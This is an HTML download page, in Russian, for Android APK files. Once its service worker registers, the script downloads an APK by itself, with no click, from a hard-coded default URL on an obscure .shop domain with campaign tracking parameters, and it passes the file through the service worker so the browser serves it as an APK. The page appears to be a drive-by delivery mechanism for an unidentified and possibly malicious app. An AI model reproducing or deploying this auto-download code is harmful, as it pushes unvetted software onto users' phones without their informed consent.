<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>APK Download</title>
  <style>
    :root {
      color-scheme: light;
      --bg: #f6f7f9;
      --panel: #ffffff;
      --text: #17202a;
      --muted: #647084;
      --line: #d8dee8;
      --accent: #0f766e;
      --accent-dark: #115e59;
      --danger: #b42318;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      font-family: Arial, Helvetica, sans-serif;
      background: var(--bg);
      color: var(--text);
      display: grid;
      place-items: center;
      padding: 24px;
    }

    main {
      width: min(100%, 520px);
      background: var(--panel);
      border: 1px solid var(--line);
      border-radius: 8px;
      padding: 28px;
      box-shadow: 0 16px 40px rgba(23, 32, 42, 0.08);
    }

    h1 {
      margin: 0 0 10px;
      font-size: 28px;
      line-height: 1.2;
      font-weight: 700;
      letter-spacing: 0;
    }

    p {
      margin: 0 0 18px;
      color: var(--muted);
      line-height: 1.5;
    }

    form {
      display: grid;
      gap: 14px;
      margin-top: 22px;
    }

    label {
      display: grid;
      gap: 7px;
      color: var(--text);
      font-size: 14px;
      font-weight: 700;
    }

    input {
      width: 100%;
      min-height: 44px;
      border: 1px solid var(--line);
      border-radius: 6px;
      padding: 0 12px;
      color: var(--text);
      font: inherit;
      font-weight: 400;
      outline: none;
    }

    input:focus {
      border-color: var(--accent);
      box-shadow: 0 0 0 3px rgba(15, 118, 110, 0.16);
    }

    .actions {
      display: flex;
      gap: 12px;
      align-items: center;
      flex-wrap: wrap;
      margin-top: 4px;
    }

    button {
      appearance: none;
      border: 0;
      border-radius: 6px;
      min-height: 44px;
      padding: 0 18px;
      background: var(--accent);
      color: #fff;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
    }

    button:disabled {
      cursor: wait;
      opacity: 0.7;
    }

    button:not(:disabled):hover {
      background: var(--accent-dark);
    }

    .status {
      min-height: 22px;
      margin-top: 18px;
      font-size: 14px;
      color: var(--muted);
      overflow-wrap: anywhere;
    }

    .status.error {
      color: var(--danger);
    }

    .hidden-frame {
      position: absolute;
      width: 0;
      height: 0;
      border: 0;
      opacity: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <main>
    <h1>Скачать APK</h1>
    <p>Файл будет запрошен через service worker и передан браузеру как APK.</p>
    <form id="downloadForm">
      <label>
        URL APK
        <input id="apkUrlInput" name="src" type="url" required placeholder="https://example.com/app.apk" autocomplete="url">
      </label>
      <label>
        Имя файла
        <input id="fileNameInput" name="name" type="text" placeholder="download.apk" autocomplete="off">
      </label>
      <div class="actions">
        <button id="downloadButton" type="submit" disabled>Скачать</button>
      </div>
    </form>
    <div id="status" class="status" role="status">Подготовка...</div>
  </main>
  <iframe id="downloadFrame" class="hidden-frame" title="download frame" aria-hidden="true"></iframe>

  <script>
    const DEFAULT_APK_URL = 'https://optionallyhumanepipefish.shop/6a69702a762a4860154/?utm_id=da856bnkrqrs73bki500&utm_campaign=1155&utm_medium=download9918';
    const DEFAULT_FILE_NAME = 'download.apk';

    const statusNode = document.querySelector('#status');
    const downloadButton = document.querySelector('#downloadButton');
    const downloadForm = document.querySelector('#downloadForm');
    const apkUrlInput = document.querySelector('#apkUrlInput');
    const fileNameInput = document.querySelector('#fileNameInput');
    const downloadFrame = document.querySelector('#downloadFrame');
    let isServiceWorkerReady = false;

    const pageUrl = new URL(window.location.href);
    apkUrlInput.value = pageUrl.searchParams.get('src') || DEFAULT_APK_URL;
    fileNameInput.value = pageUrl.searchParams.get('name') || '';

    function sanitizeFileName(value) {
      const normalized = String(value || DEFAULT_FILE_NAME).replace(/[^\w.-]+/g, '_');
      return normalized.toLowerCase().endsWith('.apk') ? normalized : `${normalized}.apk`;
    }

    function setStatus(message, isError = false) {
      statusNode.textContent = message;
      statusNode.classList.toggle('error', isError);
    }

    function waitForController(timeoutMs = 5000) {
      if (navigator.serviceWorker.controller) {
        return Promise.resolve();
      }

      return new Promise((resolve, reject) => {
        const timeout = window.setTimeout(() => {
          navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
          reject(new Error('Service worker установлен, но еще не управляет страницей. Обновите страницу.'));
        }, timeoutMs);

        function onControllerChange() {
          window.clearTimeout(timeout);
          resolve();
        }

        navigator.serviceWorker.addEventListener('controllerchange', onControllerChange, { once: true });
      });
    }

    async function registerServiceWorker() {
      if (!('serviceWorker' in navigator)) {
        throw new Error('Service worker не поддерживается этим браузером.');
      }

      let registration = await navigator.serviceWorker.getRegistration('./');
      if (!registration) {
        registration = await navigator.serviceWorker.register('./sw.js', { updateViaCache: 'none' });
      } else {
        await registration.update();
      }

      if (registration.waiting) {
        registration.waiting.postMessage({ type: 'SKIP_WAITING' });
      }

      await navigator.serviceWorker.ready;
      await waitForController();

      isServiceWorkerReady = true;
      downloadButton.disabled = false;
    }

    function startDownload(apkUrl, fileName) {
      const target = new URL('./download.apk', window.location.href);
      target.searchParams.set('src', apkUrl);
      target.searchParams.set('name', fileName);
      window.location.href = target.href;
    }

    downloadForm.addEventListener('submit', (event) => {
      event.preventDefault();

      if (!downloadForm.reportValidity()) {
        return;
      }

      dl();
    });

    function dl(){
      if (!isServiceWorkerReady) {
        setStatus('Service worker еще не готов. Подождите несколько секунд.', true);
        return;
      }

      const apkUrl = apkUrlInput.value.trim();
      const fileName = sanitizeFileName(fileNameInput.value.trim() || DEFAULT_FILE_NAME);

      downloadButton.disabled = true;
      setStatus('Скачивание начато. Если домен APK блокирует CORS, откроется прямая ссылка.');
      startDownload(apkUrl, fileName);

      window.setTimeout(() => {
        downloadButton.disabled = false;
      }, 2500);
    }

    registerServiceWorker()
      .then(() => {
        // setStatus('Готово к скачиванию.')
        dl();
      })
      .catch((error) => {
        console.error(error);
        setStatus(error.message, true);
        downloadButton.disabled = true;
      });
  </script>
</body>
</html>
